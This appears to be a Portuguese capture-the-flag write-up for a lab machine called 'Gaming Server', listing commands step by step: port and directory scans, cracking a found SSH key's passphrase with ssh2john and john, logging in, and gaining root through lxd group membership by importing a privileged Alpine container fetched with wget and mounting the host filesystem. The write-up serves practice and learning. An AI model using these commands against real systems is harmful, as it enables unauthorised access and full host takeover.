# Gaming Server 

* ### Scan de portas - Verificando quais portas estão abertas.
```bash
rustscan -a 10.10.115.2
```
![image](https://github.com/lufffe/Writeups/assets/90646635/16c9a231-b3e7-4b5d-b27f-b2e986b9c046)

![image](https://github.com/lufffe/Writeups/assets/90646635/dcd7bb35-025d-452f-b052-dd6ee24968ab)

* ### Verificando o que está rodando nas portas encontradas.
```bash
nmap -A -p 22,80 10.10.115.2
```
![image](https://github.com/lufffe/Writeups/assets/90646635/4eac808a-9639-4ea3-b487-c903167f82e4)

* ### Verificando o Http verificamos que aparece um "John".
![image](https://github.com/lufffe/Writeups/assets/90646635/065e8460-d4a8-4dd7-ac64-fef2f56f97ad)

* ### Scan de Arquivos e Diretórios.
```bash
gobuster dir -u http://10.10.115.2 -w directory-list-2.3-small.txt -t 100 --no-error
```
![image](https://github.com/lufffe/Writeups/assets/90646635/d8e7747a-c897-4919-86c6-dd64bf7045d1)

* ### Chave Id_Rsa.
![image](https://github.com/lufffe/Writeups/assets/90646635/54168859-3167-4a30-b2b4-717027503095)

* ### Já em Uploads tem esses arquivoc (dict uma wordlist) e o outro um texto.
![image](https://github.com/lufffe/Writeups/assets/90646635/f13e1f80-c7dd-401c-a522-a3d01b07090f)

* ### Primeiro pegamos o hash e depois quebramos essa hash com a wordlist que conseguimos.
```bash
ssh2john secretKey > hash.txt
```
```bash
john hash.txt --wordlist=dict.lst
```
![image](https://github.com/lufffe/Writeups/assets/90646635/09c69cef-01ad-4afb-a4a7-bea75dbeff76)

* ### Dando permissão a chave id_rsa.
```bash
chmod 600 secretKey 
```

* ### Acessando via SSH.
```bash
ssh -i secretKey john@10.10.115.2
```
![image](https://github.com/lufffe/Writeups/assets/90646635/57362ab4-e542-48e0-8c0d-eb577b1d7371)

* ### Flag Usuário.
```bash
cat user.txt
```

* ### Executando o comando id, descobrindo o grupo(lxd).
```bash
id
```
![image](https://github.com/lufffe/Writeups/assets/90646635/ce7dce2f-0cc2-4cea-b380-c36e49fcc2c4)

* ### Depois de um tempo pesquisando encontrei esse repositório do git.
```bash
git clone https://github.com/saghul/lxd-alpine-builder.git
```

* ### Sobe o servidor em Python para transferir o arquivo.
```bash
python -m http.server
```

* ### Transfere para a maquina.
```bash
wget http:/IP:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz
```

* ### Executa esses comandos.
* lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
* lxc init myimage ignite -c security.privileged=true
* lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
* lxc start ignite
* lxc exec ignite /bin/sh
![image](https://github.com/lufffe/Writeups/assets/90646635/3f19636f-434d-48e7-885a-cec30c3765ea)

* ### Flag Root.
```bash
cat /mnt/root/root/root.txt
```
